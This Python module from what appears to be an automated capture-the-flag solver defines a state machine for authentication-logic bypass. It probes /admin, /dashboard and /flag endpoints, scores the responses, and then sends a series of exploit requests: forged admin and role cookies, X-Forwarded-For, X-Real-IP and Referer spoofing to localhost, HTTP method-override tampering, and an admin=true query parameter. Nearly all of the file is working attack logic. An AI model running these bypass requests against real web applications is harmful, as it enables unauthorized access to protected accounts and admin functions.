"""Auth Logic route state machine — cookie manipulation, header spoofing, param bypass."""
from __future__ import annotations

from typing import Any, Callable, Dict, List, Optional, Tuple

import requests

from autopnex.ctf.route_state_machine import (
    RouteStateMachine,
    EvidenceScore,
    ProbeResult,
    MACHINE_REGISTRY,
)


class AuthLogicMachine(RouteStateMachine):
    """State machine for authentication/authorization logic bypass.

    Covers:
    - Cookie manipulation (admin=1, role=admin, is_admin=true)
    - Header spoofing (X-Forwarded-For, Referer, X-Real-IP)
    - POST parameter type bypass (arrays, type juggling)
    - HTTP verb tampering
    """

    route = "auth_logic"

    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
        # Auth logic bypass is worth trying if we see login forms or auth-related endpoints
        forms = blackboard_state.get("forms", [])
        endpoints = blackboard_state.get("key_endpoints", [])
        cookies = blackboard_state.get("cookies", [])

        for form in forms:
            if form.get("auth"):
                return True, "Auth-related form detected"

        for ep in endpoints:
            path = ep.get("path", "").lower()
            if any(kw in path for kw in ("/admin", "/login", "/auth", "/dashboard", "/flag")):
                return True, f"Auth-related endpoint: {path}"

        if cookies:
            return True, "Cookies present — may be manipulable"

        # Always worth a quick probe
        return True, "Auth logic probe is cheap"

    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
        """Probe for auth-related endpoints."""
        return [
            ("admin_page", "/admin", None),
            ("dashboard", "/dashboard", None),
            ("flag_page", "/flag", None),
            ("admin_flag", "/admin/flag", None),
        ]

    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
        """Send probe to auth-related paths."""
        return self._get(payload_template)

    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
        text = response.text.lower() if response.text else ""
        status = response.status_code

        # 403/401 on admin pages means auth is enforced — bypass may work
        if status in (401, 403):
            return EvidenceScore("auth_logic", 0.7, probe_name,
                                 f"Auth enforced on {probe_name} (status {status})")

        # 302 redirect to login
        if status == 302:
            location = response.headers.get("Location", "").lower()
            if "login" in location:
                return EvidenceScore("auth_logic", 0.65, probe_name,
                                     "Redirect to login — auth required")

        # Page mentions admin/login
        if status == 200:
            if "admin" in text or "login" in text or "unauthorized" in text:
                return EvidenceScore("auth_logic", 0.5, probe_name,
                                     "Auth-related content on page")

        return EvidenceScore("auth_logic", 0.0, probe_name,
                             f"No auth indicators (status {status})")

    def get_exploit_steps(self) -> List[Dict[str, Any]]:
        """Auth bypass exploit steps."""
        steps = [
            # Cookie manipulation
            {
                "name": "cookie_admin_1",
                "description": "Set admin=1 cookie",
                "method": "GET",
                "path": "/admin",
                "headers": {"Cookie": "admin=1"},
                "extract_flag": True,
            },
            {
                "name": "cookie_role_admin",
                "description": "Set role=admin cookie",
                "method": "GET",
                "path": "/admin",
                "headers": {"Cookie": "role=admin"},
                "extract_flag": True,
            },
            {
                "name": "cookie_is_admin_true",
                "description": "Set is_admin=true cookie",
                "method": "GET",
                "path": "/flag",
                "headers": {"Cookie": "is_admin=true; user=admin"},
                "extract_flag": True,
            },
            # X-Forwarded-For spoofing (localhost bypass)
            {
                "name": "xff_localhost",
                "description": "X-Forwarded-For: 127.0.0.1",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            {
                "name": "xff_localhost_flag",
                "description": "XFF 127.0.0.1 on /flag",
                "method": "GET",
                "path": "/flag",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            # X-Real-IP spoofing
            {
                "name": "xrealip_localhost",
                "description": "X-Real-IP: 127.0.0.1",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-Real-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            # Referer spoofing
            {
                "name": "referer_localhost",
                "description": "Referer: http://localhost/admin",
                "method": "GET",
                "path": "/flag",
                "headers": {"Referer": "http://localhost/admin"},
                "extract_flag": True,
            },
            # HTTP verb tampering
            {
                "name": "verb_tamper_admin",
                "description": "PUT request to /admin",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-HTTP-Method-Override": "PUT"},
                "extract_flag": True,
            },
            # POST param type bypass (send as GET with admin param)
            {
                "name": "param_admin_true",
                "description": "GET /admin?admin=true",
                "method": "GET",
                "path": "/admin",
                "params": {"admin": "true"},
                "extract_flag": True,
            },
            # Combined cookie + header
            {
                "name": "combined_bypass",
                "description": "Combined cookie + XFF bypass",
                "method": "GET",
                "path": "/admin",
                "headers": {
                    "Cookie": "admin=1; role=admin; is_admin=true",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Referer": "http://localhost/admin",
                },
                "extract_flag": True,
            },
        ]
        return steps


# Register in MACHINE_REGISTRY
MACHINE_REGISTRY["auth_logic"] = AuthLogicMachine
